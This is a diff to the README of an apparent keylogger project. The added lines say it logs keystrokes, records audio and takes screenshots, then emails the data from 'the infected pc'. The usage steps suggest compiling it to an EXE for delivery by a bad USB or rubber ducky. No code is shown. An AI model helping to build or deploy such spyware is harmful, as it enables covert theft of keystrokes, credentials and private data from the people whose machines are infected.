@@ -1,12 +1,16 @@
 # advanced-keylogger v0.1
 
+Advanced Keylogger: register keypresses, record audio, take screenshots AUTOMATICALLY. The script will also encrypt every information and send you through e-mail. It will also delete those files so they don't eat the infected pc's memory.
+
+## Available for Windows and Linux
+
 ### How To  Use:
 
 1-Change Email variables
 
 2-Change Timers and Tickrate
 
-3-Compile it into EXE
+3-Compile it into EXE (setup a bad USB or rubber ducky)
 
 
 ### Functionalities:
